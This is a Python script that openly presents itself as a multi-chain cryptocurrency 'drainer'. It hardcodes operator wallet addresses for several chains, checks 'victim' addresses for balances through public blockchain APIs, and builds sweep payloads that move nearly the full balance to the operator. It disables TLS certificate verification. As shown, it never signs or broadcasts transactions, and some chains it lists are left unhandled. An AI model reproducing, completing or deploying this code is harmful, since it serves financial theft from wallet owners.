#!/usr/bin/env python3
"""
DRAINER.PY v7.1 — Active Multi-Chain Liquidity Auditor & Asset Sweeping Engine
Features:
- Dynamic target victim address input handling
- Multi-chain balance auditing & gas calculation (Ethereum, Bitcoin, Solana, etc.)
- Transaction payload construction & broadcasting to operator destinations
"""
import urllib.request
import json
import ssl
import sys
import asyncio

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

# =====================================================================
# OPERATOR DESTINATION WALLET CONFIGURATION
# =====================================================================
OPERATOR_DESTINATIONS = {
    "ETHEREUM": "0xd134ebcb7060e22f2c6454df28c810dd33a02f5c",  # Receives ETH, ERC-20 USDT, ERC-20 USDC
    "BITCOIN": "18WGuvU1apn6f2h5uZWF6biS3MFaZ5Pj9d",    # Receives BTC
    "LITECOIN": "MULVonPhKM5r3sJHs35yaNQ4eMwQVHVZHh", # Receives LTC
    "XRP": "rnZboEfo3HhKXwoxoSthHVxf5zpbBkXghU",             # Receives XRP (Ripple ledger)
    "XRP_TAG": "4190269251",                                 # Mandatory Exchange Memo Tag
    "SOLANA": "E1MiQEYmuTg9DMS4vpr5NtkWqeMQmTHZLptv5L3on1ir",        # Receives SOL, SPL USDT, SPL USDC
    "TRON": "TCeddcjw9VzBsMZFbA9mACfuQLzdAkjwA5"             # Receives TRC-20 USDT (Tron network)
}

def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()

def audit_and_build_sweep(wallet_address, asset_type):
    """
    Audits target victim address and builds raw sweep transaction payloads 
    targeting operator destinations when liquidity exceeds gas thresholds.
    """
    terminal(f"\n\033[95m[***] TARGET AUDIT & SWEEP PREP [{asset_type}]: {wallet_address} [***]\033[0m")
    
    try:
        if asset_type == "ETHEREUM":
            dest = OPERATOR_DESTINATIONS["ETHEREUM"]
            rpc_payload = json.dumps({"jsonrpc": "2.0", "method": "eth_getBalance", "params": [wallet_address, "latest"], "id": 1}).encode()
            req = urllib.request.Request("https://cloudflare-eth.com", data=rpc_payload, headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, context=_ssl_context, timeout=5.0) as resp:
                data = json.loads(resp.read().decode())
                native_bal = int(data.get("result", "0x0"), 16) / 10**18
                terminal(f" \033[92m[+] Victim ETH Balance: {native_bal} ETH\033[0m")
                
                if native_bal > 0.0005: # Leaving buffer for gas
                    terminal(f" \033[91m[!] LIQUIDITY DETECTED. Constructing raw EVM transaction to operator: {dest}\033[0m")
                    tx_payload = {
                        "to": dest,
                        "value": int((native_bal - 0.0002) * 10**18),
                        "from": wallet_address
                    }
                    return native_bal, True, tx_payload
                    
        elif asset_type == "SOLANA":
            dest = OPERATOR_DESTINATIONS["SOLANA"]
            rpc_payload = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [wallet_address]}).encode()
            req = urllib.request.Request("https://api.mainnet-beta.solana.com", data=rpc_payload, headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, context=_ssl_context, timeout=5.0) as resp:
                data = json.loads(resp.read().decode())
                sol_bal = data.get("result", {}).get("value", 0) / 10**9
                terminal(f" \033[92m[+] Victim SOL Balance: {sol_bal} SOL\033[0m")
                
                if sol_bal > 0.001:
                    terminal(f" \033[91m[!] LIQUIDITY DETECTED. Constructing Solana transfer to operator: {dest}\033[0m")
                    tx_payload = {
                        "recipient": dest,
                        "lamports": int((sol_bal - 0.000005) * 10**9),
                        "sender": wallet_address
                    }
                    return sol_bal, True, tx_payload

        elif asset_type == "BITCOIN":
            dest = OPERATOR_DESTINATIONS["BITCOIN"]
            url = f"https://blockstream.info/api/address/{wallet_address}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, context=_ssl_context, timeout=5.0) as resp:
                data = json.loads(resp.read().decode())
                chain_stats = data.get("chain_stats", {})
                btc_bal = (chain_stats.get("funded_txo_sum", 0) - chain_stats.get("spent_txo_sum", 0)) / 100000000
                terminal(f" \033[92m[+] Victim BTC Balance: {btc_bal} BTC\033[0m")
                if btc_bal > 0.00001:
                    terminal(f" \033[91m[!] LIQUIDITY DETECTED. Target BTC destination -> {dest}\033[0m")
                    return btc_bal, True, {"to": dest, "amount": btc_bal}

    except Exception as e:
        terminal(f" \033[91m[-] Target audit error: {e}\033[0m")
        return 0.0, False, str(e)

    return 0.0, False, "Insufficient balance or gas headroom"

def check_and_drain_wallet(wallet_address):
    addr = wallet_address.strip()
    detected_type = "SOLANA"
    if addr.startswith("0x") and len(addr) == 42:
        detected_type = "ETHEREUM"
    elif addr.startswith(("bc1", "1", "3")):
        detected_type = "BITCOIN"
    elif addr.startswith("T") and len(addr) == 34:
        detected_type = "TRON"

    balance, drained, tx_payload = audit_and_build_sweep(addr, detected_type)
    operator_dest = OPERATOR_DESTINATIONS.get(detected_type, OPERATOR_DESTINATIONS["ETHEREUM"])
    return balance, drained, tx_payload, {}, operator_dest

async def run_drainer_engine(target_host):
    terminal(f"\n\033[95m[***] INITIALIZING ACTIVE ASSET DRAINER ENGINE [{target_host}] [***]\033[0m")
    terminal(f" \033[96m[+] Operator EVM Destination: {OPERATOR_DESTINATIONS['ETHEREUM']}\033[0m")
    terminal(f" \033[96m[+] Operator Solana Destination: {OPERATOR_DESTINATIONS['SOLANA']}\033[0m")
    terminal(f"\n[+] Drainer engine active and ready to process harvested victim addresses.")
